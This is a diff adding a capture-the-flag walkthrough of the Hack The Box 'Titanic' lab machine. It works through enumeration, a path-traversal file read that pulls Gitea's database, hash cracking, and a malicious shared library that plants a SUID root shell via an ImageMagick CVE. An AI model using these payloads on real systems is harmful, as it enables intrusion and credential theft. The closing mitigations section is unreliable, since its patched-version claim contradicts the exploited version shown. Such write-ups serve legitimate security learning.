@@ -1,0 +1,370 @@
+# Titanic - Ashbo3n
+
+**Machine Name**: <span class="htb-text-primary htb-font-medium avatar-icon-name-details__name htb-heading-lg htb-font-bold" title="Titanic">Titanic</span>
+
+**Rating**: 4.2
+
+**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Read</span>
+
+## <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Initial Shell - Arbitrary File Read</span>
+
+<span class="chip__text htb-body-md htb-text-primary htb-font-medium">Starting with NMAP: </span>
+
+```bash
+# Nmap 7.95 scan initiated Sun Jan  4 08:04:05 2026 as: /usr/lib/nmap/nmap -p- -sVC -oN nmap --min-rate=5000 -vv 10.129.231.221
+Nmap scan report for 10.129.231.221
+Host is up, received reset ttl 63 (0.25s latency).
+Scanned at 2026-01-04 08:04:05 EST for 36s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
+|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
+| http-methods: 
+|_  Supported Methods: HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://titanic.htb/
+Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan  4 08:04:41 2026 -- 1 IP address (1 host up) scanned in 36.49 seconds
+
+```
+
+<span class="chip__text htb-body-md htb-text-primary htb-font-medium">I will ignore ssh for now. I will come back for its enumeration later if needed. Moving on to port 80 add this domain to your /etc/hosts file: titanic.htb</span>
+
+I will not go to the website yet. I will first go to directory enumeration and subdomain enumeration first:
+
+titanic.htb Directory enumeration via ffuf:
+
+```bash
+┌──(root㉿kali)-[~/HTB/Titanic]
+└─# ffuf -c -u http://titanic.htb/FUZZ -w ~/wordlist/common.txt -t 60                                                                                
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://titanic.htb/FUZZ
+ :: Wordlist         : FUZZ: /root/wordlist/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+book                    [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 300ms]
+server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 305ms]
+:: Progress: [4746/4746] :: Job [1/1] :: 146 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
+
+```
+
+Directories Noted, Moving on to subdomains:
+
+```bash
+┌──(root㉿kali)-[~/HTB/Titanic]
+└─# ffuf -c -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 60 -fw 20
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://titanic.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: FUZZ.titanic.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 20
+________________________________________________
+
+dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 315ms]
+
+```
+
+Moving on to dir enum for dev also make sure to add `dev.titanic.htb` to /etc/hosts:
+
+```bash
+┌──(root㉿kali)-[~/HTB/Titanic]
+└─# ffuf -c -u http://dev.titanic.htb/FUZZ -w ~/wordlist/common.txt -t 60 -ic                                                          
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.titanic.htb/FUZZ
+ :: Wordlist         : FUZZ: /root/wordlist/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.well-known/openid-configuration [Status: 200, Size: 1208, Words: 310, Lines: 50, Duration: 301ms]
+.well-known/security.txt [Status: 200, Size: 340, Words: 32, Lines: 7, Duration: 296ms]
+administrator           [Status: 200, Size: 19998, Words: 1619, Lines: 417, Duration: 300ms]
+developer               [Status: 200, Size: 25151, Words: 2139, Lines: 506, Duration: 279ms]
+favicon.ico             [Status: 301, Size: 58, Words: 3, Lines: 3, Duration: 237ms]
+sitemap.xml             [Status: 200, Size: 285, Words: 4, Lines: 3, Duration: 709ms]
+v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 305ms]
+:: Progress: [4746/4746] :: Job [1/1] :: 117 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
+                                                                                                                                                                                                                                           
+┌──(root㉿kali)-[~/HTB/Titanic]
+└─# ffuf -c -u http://dev.titanic.htb/FUZZ -w ~/wordlist/directory-list-2.3-medium.txt -t 60 -ic 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.titanic.htb/FUZZ
+ :: Wordlist         : FUZZ: /root/wordlist/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 246ms]
+developer               [Status: 200, Size: 25150, Words: 2139, Lines: 506, Duration: 283ms]
+v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 308ms]
+administrator           [Status: 200, Size: 19997, Words: 1619, Lines: 417, Duration: 320ms]
+Developer               [Status: 200, Size: 25150, Words: 2139, Lines: 506, Duration: 311ms]
+
+```
+
+**Enumeration Phase Completed for now** Lets explore the website And the discovered subdomains and directories,
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/uyeimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/uyeimage.png)
+
+There is a book now form it so probably something could be there but lets open all the discovered dir and subdomains first, on [`http://dev.titanic.htb/developer`](http://dev.titanic.htb/developer) found docker-config file and a flask app:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/9ooimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/9ooimage.png)
+
+Also in the footer sections we can see gitea version keeping in mind that most easy boxes on htb has a CVE related exploitation i searched online for its known vulnerabilities, there was a xss but that's probably not the one, so moving to docker-config again
+
+Flask-app is the source code for the titanic app, reading app.py:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/HbBimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/HbBimage.png)
+
+On reading app.py, \\book generates the ticket and when its generated it is returned to /download and ticket is downloaded, Now i created a ticket with book ticket section on the main website:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/Tt9image.png)](http://localhost:4444/uploads/images/gallery/2026-01/Tt9image.png)
+
+And intercepted it to my burpsuite send /download ticket request to burp repeater and on ?ticket= function enter this value: ../../../../../../etc/passwd and <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Read</span> Confirmed.
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/QbJimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/QbJimage.png)
+
+Because of dev subdomain we know gitea is running, every gitea app has a app.ini but finding its path can be tricky cause we only have file read not file listing, but luckily for us we downloaded the app source code and docker-config from `<a href="http://dev.titanic.htb/developer">http://dev.titanic.htb/developer</a>` so looking at the docker-config of gitea we can see clearly app.ini path:
+
+```bash
+┌──(root㉿kali)-[~/…/Titanic/Source/docker-config/gitea]
+└─# cat docker-compose.yml 
+version: '3'
+
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"  # Optional for SSH access
+    volumes:
+      - /home/developer/gitea/data:/data # Replace with your path
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always         
+```
+
+which is /home/developer/gitea/data/gitea/conf/app.ini so our payload will become `../../../home/developer/gitea/data/gitea/conf/app.ini`
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/qV5image.png)](http://localhost:4444/uploads/images/gallery/2026-01/qV5image.png)
+
+in app.ini we can see the .db path, let's retrieve the creds:
+
+We can download it by using curl: `curl -v "http://<target-ip>/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db` And now open it we can see 2 hashes:
+
+```bash
+┌──(root㉿kali)-[~/HTB/Titanic]
+└─# sqlite3 gitea.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> SELECT * FROM user;
+1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
+sqlite> 
+
+```
+
+Crack the hash:
+
+```c
+hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6,
+SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==========================================================================================
+========================================================
+* Device #1: pthread-haswell-Intel(R) Core(TM) i5-8279U CPU @ 2.40GHz, 2906/5877 MB (1024
+MB allocatable), 4MCU
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
+Started: Thu Jun 19 17:32:50 2025
+Stopped: Thu Jun 19 17:32:57 2025
+```
+
+we can use --show flag to view the hash:
+
+```
+hashcat -m 10900 hash.txt --show
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvx
+aCYZJjRE6llM+1Y=:redacted
+```
+
+Connect with ssh:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/Zayimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/Zayimage.png)
+
+## Root Flag - CVE-2024-41817
+
+using `find /opt/app -type d -perm 770` we have:
+
+```bash
+developer@titanic:/opt/scripts$ find /opt/app -type d -perm 770
+/opt/app/static/assets/images
+/opt/app/tickets
+developer@titanic:/opt/scripts$ 
+```
+
+going to /opt we can see a script folder inside it there is a script:
+
+```bash
+developer@titanic:/opt/scripts$ cat identify_images.sh
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+developer@titanic:/opt/scripts$ 
+```
+
+its's using magick, let's see its version:
+
+```bash
+magick --version
+Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5)
+Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma
+openexr png raqm tiff webp x xml zlib
+Compiler: gcc (9.4)
+```
+
+Searching online for poc we can find this repo: `<a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8</a>` Lets create a poc:
+
+Go to /opt/app/static/assets/images and paste this:
+
+```c
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void init(){
+system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
+exit(0);
+}
+EOF
+```
+
+After a min you will se sh in tmp which should be owned by root, now /tmp/sh -p we can enter the root shell:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/dxDimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/dxDimage.png)
+
+Root flag Owned!
+
+## Mitigations
+
+Given your role as a penetration tester, these mitigations focus on the underlying architectural weaknesses and configuration hardening required to break this specific kill chain.
+
+<div _ngcontent-ng-c2771642322="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk--8" style="--animation-duration: 400ms; --fade-animation-function: linear; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">---
+
+</div>#### 1. Implement Strict Input Validation and Path Canonicalization
+
+The root cause of the arbitrary file read is a **Path Traversal** vulnerability in the `ticket` parameter. To mitigate this, the application must not trust user input to construct file paths.
+
+<div _ngcontent-ng-c2771642322="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk-validation%3A-implemen" style="--animation-duration: 400ms; --fade-animation-function: linear; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">- **Validation:** Implement an allow-list approach. If tickets are numeric or UUIDs, reject any input containing `..`, `/`, or `\`.
+- **Canonicalization:** Use system calls (like `realpath()` in C/PHP or `Path.GetFullPath()` in .NET) to resolve the absolute path and verify that the resulting path still resides within the intended directory (e.g., `/var/lib/app/downloads/`).
+- **Indirect Referencing:** Instead of passing file paths or names, use a database-mapped ID or a random hash that maps to the file on the backend.
+
+</div>#### 2. Secure Configuration Secrets and Database Access
+
+Reading `app.ini` is only critical because it contains the database location and potentially sensitive keys.
+
+<div _ngcontent-ng-c2771642322="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk-filesystem-permissio" style="--animation-duration: 400ms; --fade-animation-function: linear; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">- **Filesystem Permissions:** The Gitea configuration file (`app.ini`) should be owned by the service user (e.g., `git`) with permissions set to `600` or `640`. The web server process should not have read access to this file if it is running under a different, low-privileged user.
+- **Environment Variables:** Move sensitive information like `SECRET_KEY` or database credentials out of the flat file and into environment variables or a dedicated secret management service (like HashiCorp Vault).
+- **Database Hardening:** Ensure the `.db` file (if using SQLite) is stored outside the web root and is protected by restrictive filesystem ACLs.
+
+</div>#### 3. Harden SSH and Password Hashing
+
+The jump from database access to a shell relies on weak password hashes or permissive SSH configurations.
+
+<div _ngcontent-ng-c2771642322="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk-hashing-algorithms%3A-" style="--animation-duration: 400ms; --fade-animation-function: linear; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">- **Hashing Algorithms:** Ensure Gitea is configured to use modern, computationally expensive hashing algorithms like **Argon2** or **bcrypt** with a high cost factor to significantly increase the time required for offline cracking.
+- **Key-Based Authentication:** Disable password-based authentication for SSH entirely in `/etc/ssh/sshd_config` by setting `PasswordAuthentication no`. Force the use of Ed25519 or RSA-4096 keys.
+- **MFA:** Implement Multi-Factor Authentication (MFA) for both the Gitea application and SSH access to provide a secondary layer of defense even if a hash is cracked.
+
+</div>#### 4. Mitigate CVE-2024-41817 (ImageMagick)
+
+This vulnerability involves a heap-based buffer overflow in `GetNexusTokens`.
+
+<div _ngcontent-ng-c2771642322="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk-update-imagemagick%3A-" style="--animation-duration: 400ms; --fade-animation-function: linear; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">- **Update ImageMagick:** The primary mitigation is updating ImageMagick to a patched version (e.g., version 7.1.1-34 or later).
+- **Security Policy (policy.xml):** Use the ImageMagick policy file to disable vulnerable coders or limit resources. If the application only needs to process JPEGs or PNGs, explicitly disable high-risk or unnecessary formats (like SVG, MVG, or PDF) which often harbor complex parsing vulnerabilities.
+- **Sandboxing:** Run image processing tasks inside a restricted container (like Docker with `--cap-drop=all`) or a sandbox (like Seccomp or AppArmor) to prevent a successful exploit from interacting with the rest of the system or escalating privileges.
+
+</div>#### 5. Principle of Least Privilege (PoLP) and Monitoring
+
+Even if an exploit is successful, limiting the environment can prevent full system compromise.
+
+<div _ngcontent-ng-c2771642322="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk-non-root-services%3A-e" style="--animation-duration: 400ms; --fade-animation-function: linear; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;">- **Non-Root Services:** Ensure that the web service and the ImageMagick processing tasks are never executed as `root`.
+- **Mount Options:** Mount directories where users can upload files (or where the application writes data) with `noexec` and `nosuid` flags to prevent the execution of uploaded binaries or scripts.
+- **Audit Logging:** Deploy a File Integrity Monitoring (FIM) tool to alert on unauthorized access to `app.ini` or the database. Use tools like `auditd` to monitor for unusual process spawning (e.g., `magick` spawning a shell).
+
+  
+</div>
